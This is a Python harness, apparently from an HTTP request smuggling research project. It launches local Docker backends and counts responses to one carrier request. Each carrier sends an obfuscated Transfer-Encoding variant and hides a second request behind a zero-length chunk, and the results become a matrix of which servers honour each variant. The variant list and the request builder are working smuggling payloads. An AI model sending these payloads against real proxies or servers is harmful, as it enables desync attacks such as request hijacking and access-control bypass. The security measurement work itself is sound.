#!/usr/bin/env python3
# Phage: HTTP framing honor matrix runner.
# License: Apache-2.0 License

"""Measure which HTTP implementations honor which malformed Transfer-Encoding, so a
smuggling pair can be predicted instead of guessed.

A desync is a disagreement between two parsers, so the exploitable question is never
"is this proxy vulnerable" but "does the backend behind it draw the message boundary
somewhere else". This measures the second half.

Signal: the number of HTTP response status lines the server emits for ONE carrier
request whose body contains a second, complete request after a zero-length chunk.
Two responses means the server de-chunked, honored Transfer-Encoding, and framed the
smuggled bytes as a request of their own. That is language-agnostic, so no
per-backend logging is needed.

Every row is gated on a per-backend CONTROL: an explicitly pipelined pair that any
correct server must answer with two responses. If the control does not produce two,
the counter cannot reach two on that backend and every verdict from it is discarded
as UNTRUSTED rather than reported as safe. A negative from an instrument that has
not been shown to produce a positive is not evidence of absence.

Usage:
  python matrix/run_matrix.py                 # every backend
  python matrix/run_matrix.py --only Node,Go  # substring filter
  python matrix/run_matrix.py --json out.json --md MATRIX.md
"""

import argparse
import json
import socket
import subprocess
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from backends import BACKENDS  # noqa: E402

# The framing header blocks under test. Each entry is the raw header line(s) inserted
# after Content-Length, so a variant can express what a single value cannot: a duplicated
# Transfer-Encoding, an obs-fold continuation, a second conflicting coding. The first
# entry is well-formed and acts as the reference; a server honoring plain `chunked` is
# behaving correctly, and the obfuscated rows decide whether a lenient front end can be
# paired with it.
VARIANTS = [
    ("chunked", b"Transfer-Encoding: chunked"),
    ("chunked<TAB>", b"Transfer-Encoding: chunked\t"),
    ("chunked<SP>", b"Transfer-Encoding: chunked "),
    ("chunked<VT>", b"Transfer-Encoding: chunked\x0b"),
    ("CHUNKED", b"Transfer-Encoding: CHUNKED"),
    ("chunked;a=b", b"Transfer-Encoding: chunked;a=b"),
    ("chunked, identity", b"Transfer-Encoding: chunked, identity"),
    ("identity, chunked", b"Transfer-Encoding: identity, chunked"),
    ("dup TE", b"Transfer-Encoding: chunked\r\nTransfer-Encoding: identity"),
    ("TE obs-fold", b"Transfer-Encoding: chunked\r\n\tidentity"),
    ("xchunked", b"Transfer-Encoding: xchunked"),
]

SMUGGLED = b"GET /SMUGGLED HTTP/1.1\r\nHost: lab\r\n\r\n"
CONTAINER = "phage_matrix_target"  # suffixed per spec so specs can run side by side


def _responses(data: bytes) -> int:
    """How many FINAL HTTP responses came back on the connection.

    Counting occurrences of the status line across the whole buffer is wrong in two ways
    that both manufacture a SMUGGLE verdict for a server that framed one request, which is
    the worst error this harness can make:

      - a response BODY may contain the literal "HTTP/1.1 " (a log viewer, an error page
        quoting the request). Body bytes must be skipped, not scanned.
      - a 1xx interim response is legal and is not a framed request. "100 Continue" then
        "200 OK" is one request, not two.

    So walk the stream properly: status line, headers, skip the body by its declared
    framing, repeat. Stop at the first thing that does not parse, because a truncated tail
    is not evidence of another request."""
    count = 0
    while True:
        if not data.startswith((b"HTTP/1.1 ", b"HTTP/1.0 ")):
            return count
        head, sep, rest = data.partition(b"\r\n\r\n")
        if not sep:
            return count
        status = head.split(b"\r\n", 1)[0].split(b" ")
        code = status[1] if len(status) > 1 else b""
        headers = {}
        for line in head.split(b"\r\n")[1:]:
            name, _, value = line.partition(b":")
            headers[name.strip().lower()] = value.strip()
        # 1xx carries no body and is not a framed request of its own
        if code.startswith(b"1"):
            data = rest
            continue
        count += 1
        if headers.get(b"transfer-encoding", b"").lower().endswith(b"chunked"):
            rest = _skip_chunked(rest)
            if rest is None:
                return count
        elif b"content-length" in headers:
            try:
                n = int(headers[b"content-length"])
            except ValueError:
                return count
            if n > len(rest):
                return count
            rest = rest[n:]
        else:
            # No declared framing. RFC 9112 6.3 says such a body runs to end of connection,
            # but servers routinely answer an error with a bare status line and no body, and
            # a second one of those is exactly the signal being measured. So peek: only
            # treat the remainder as another response when it actually parses as one. A body
            # that merely happens to mention a status line does not, because it will not
            # also carry a complete header block at the boundary.
            if not (
                rest.startswith((b"HTTP/1.1 ", b"HTTP/1.0 ")) and b"\r\n\r\n" in rest
            ):
                return count
        data = rest


def _skip_chunked(data: bytes):
    """Advance past a chunked body. None when it is truncated or malformed."""
    while True:
        line, sep, rest = data.partition(b"\r\n")
        if not sep:
            return None
        try:
            size = int(line.split(b";")[0].strip(), 16)
        except ValueError:
            return None
        if size == 0:
            # trailers, then the terminating blank line
            end = rest.find(b"\r\n")
            return rest[end + 2 :] if end != -1 else b""
        if len(rest) < size + 2:
            return None
        data = rest[size + 2 :]


def _send(port: int, payload: bytes, settle: float = 2.5):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=5)
    except OSError as exc:
        return None, f"connect failed: {exc}"
    try:
        s.sendall(payload)
        s.settimeout(settle)
        out = b""
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
    except OSError:
        pass
    finally:
        s.close()
    return out, None


def build(hdr: bytes) -> bytes:
    """One carrier request whose body hides a second request behind a zero-length chunk."""
    body = b"0\r\n\r\n" + SMUGGLED
    return (
        b"POST /carrier HTTP/1.1\r\nHost: lab\r\n"
        b"Content-Length: %d\r\n%s\r\n\r\n" % (len(body), hdr)
    ) + body


def probe(port: int, hdr: bytes):
    return _send(port, build(hdr))


def control(port: int):
    """Two explicitly pipelined requests. A correct server answers with two responses.
    This proves the counter can reach two on THIS backend before any verdict is trusted."""
    req = (
        b"GET /ctl1 HTTP/1.1\r\nHost: lab\r\n\r\n"
        b"GET /ctl2 HTTP/1.1\r\nHost: lab\r\n\r\n"
    )
    return _send(port, req)


def trusted(ctl: bytes) -> bool:
    """Whether this backend's verdicts may be published at all.

    The control is two explicitly pipelined requests. A server that cannot answer them
    twice cannot make the counter reach two for any input, so its silence on the real
    variants says nothing about the server and everything about the instrument."""
    return bool(ctl) and _responses(ctl) >= 2


def classify(resp: bytes) -> str:
    """SMUGGLE  the backend framed the hidden request as a second request
    reject    it refused the message outright
    CL-safe   it framed exactly one request, reading the body by Content-Length"""
    if not resp:
        return "no-response"
    n = _responses(resp)
    first = resp.split(b"\r\n", 1)[0]
    bad = b" 4" in first[:13] or b" 5" in first[:13]
    if n >= 2:
        return "SMUGGLE"
    if bad:
        code = (
            first.split(b" ")[1].decode(errors="replace")
            if len(first.split(b" ")) > 1
            else "?"
        )
        return f"reject {code}"
    return "CL-safe"


def container_for(spec) -> str:
    return f"{CONTAINER}_{spec['port']}"


def docker(*args, **kw):
    return subprocess.run(["docker", *args], capture_output=True, text=True, **kw)


def start(spec, out) -> bool:
    name = container_for(spec)
    docker("rm", "-f", name)
    # host networking + an explicit loopback bind inside the app: these toy servers must
    # never be reachable off-box.
    r = docker(
        "run",
        "-d",
        "--name",
        name,
        "--network",
        "host",
        spec["image"],
        "sh",
        "-c",
        spec["app"],
    )
    if r.returncode != 0:
        out.append(f"    docker run failed: {r.stderr.strip()[:200]}")
        return False
    for _ in range(int(spec.get("boot", 150))):
        try:
            socket.create_connection(("127.0.0.1", spec["port"]), timeout=1).close()
            time.sleep(1.0)  # let the server finish binding before the first probe
            return True
        except OSError:
            time.sleep(1.0)
    out.append("    timed out waiting for the port")
    return False


def run(spec) -> dict:
    row = {
        "name": spec["name"],
        "parser": spec["parser"],
        "results": {},
        "trusted": False,
    }
    # Buffer this spec's lines and emit them as one block. Under --jobs the specs
    # interleave, and a log where a verdict cannot be attributed to a backend is worse
    # than no log: the JSON stays correct while a reader draws the wrong conclusion.
    out = [f"  {spec['name']} ({spec['parser']})"]
    try:
        if not start(spec, out):
            row["error"] = "failed to start"
            return row
        try:
            ctl, err = control(spec["port"])
            row["control_responses"] = _responses(ctl) if ctl else 0
            row["trusted"] = trusted(ctl)
            if not row["trusted"]:
                out.append(
                    f"    CONTROL FAILED (responses={row['control_responses']}), "
                    "verdicts untrusted"
                )
            for label, te in VARIANTS:
                resp, err = probe(spec["port"], te)
                verdict = classify(resp) if not err else f"error: {err}"
                row["results"][label] = verdict
                out.append(f"    {label:20} {verdict}")
        finally:
            docker("rm", "-f", container_for(spec))
    finally:
        print("\n".join(out), flush=True)
    return row


def to_markdown(rows) -> str:
    heads = [v[0] for v in VARIANTS]
    out = [
        "# HTTP framing honor matrix",
        "",
        "Which backend honors which malformed `Transfer-Encoding`, measured by counting the",
        "HTTP responses each server emits for one carrier request that hides a second request",
        "behind a zero-length chunk. **SMUGGLE** means the server framed the hidden request as",
        "a request of its own, so any front end that forwards this value can be paired with it",
        "for a desync.",
        "",
        "Every row is gated on a pipelining control that must produce two responses; a row that",
        "fails it is reported UNTRUSTED, never as safe.",
        "",
        "**What UNTRUSTED means.** Counting responses can only detect a second framed request on",
        "a connection the server keeps open. A backend that closes after one response cannot",
        "produce two, so the counter is structurally unable to reach a positive there and every",
        "verdict from it is withheld rather than reported as safe. That is a limit of this",
        "instrument, not a clean bill of health. It is also worth noting that such a backend is a",
        "poor smuggling target for the same reason: no connection reuse means no pooled",
        "connection to poison. To classify one properly, read what the application framed instead",
        "of what the socket returned.",
        "",
        "Generated by `python matrix/run_matrix.py`.",
        "",
        "| backend | parser | " + " | ".join(f"`{h}`" for h in heads) + " |",
        "|---|---|" + "---|" * len(heads),
    ]
    for r in rows:
        if r.get("error"):
            out.append(
                f"| {r['name']} | {r['parser']} | "
                + " | ".join(["n/a"] * len(heads))
                + " |"
            )
            continue
        cells = [r["results"].get(h, "?") for h in heads]
        name = r["name"] if r.get("trusted") else f"{r['name']} (UNTRUSTED)"
        out.append(f"| {name} | `{r['parser']}` | " + " | ".join(cells) + " |")
    smug = sorted(
        {r["name"] for r in rows if "SMUGGLE" in r.get("results", {}).values()}
    )
    out += ["", f"Backends that honor at least one variant: {len(smug)}.", ""]
    return "\n".join(out)


def prepull(specs) -> None:
    """Fetch every image up front, in parallel. Otherwise the first probe of a cold
    image is racing a download against the boot timeout, and a slow link looks like a
    backend that would not start."""
    images = sorted({s["image"] for s in specs})
    print(f"pre-pulling {len(images)} image(s)")
    with ThreadPoolExecutor(max_workers=len(images)) as pool:
        for img, r in zip(images, pool.map(lambda i: docker("pull", "-q", i), images)):
            if r.returncode != 0:
                print(f"  pull failed: {img}: {r.stderr.strip()[:120]}")


def main() -> int:
    ap = argparse.ArgumentParser(description="HTTP framing honor matrix")
    ap.add_argument("--only", help="comma-separated substrings of backend names")
    ap.add_argument("--json", default="matrix/results.json")
    ap.add_argument("--md", default="matrix/MATRIX.md")
    ap.add_argument(
        "--jobs",
        type=int,
        default=1,
        help="measure this many backends at once (each binds its own port)",
    )
    args = ap.parse_args()

    specs = BACKENDS
    if args.only:
        want = [s.strip().lower() for s in args.only.split(",")]
        specs = [s for s in specs if any(w in s["name"].lower() for w in want)]
    if not specs:
        print("no backends matched")
        return 1

    print(f"measuring {len(specs)} backend(s), jobs={args.jobs}")
    prepull(specs)
    if args.jobs > 1:
        with ThreadPoolExecutor(max_workers=args.jobs) as pool:
            rows = list(pool.map(run, specs))
    else:
        rows = [run(s) for s in specs]

    Path(args.json).parent.mkdir(parents=True, exist_ok=True)
    Path(args.json).write_text(json.dumps(rows, indent=2) + "\n")
    Path(args.md).write_text(to_markdown(rows))
    print(f"\nwrote {args.json} and {args.md}")
    untrusted = [r["name"] for r in rows if not r.get("trusted") and not r.get("error")]
    if untrusted:
        print(f"UNTRUSTED rows (control did not reach two): {', '.join(untrusted)}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
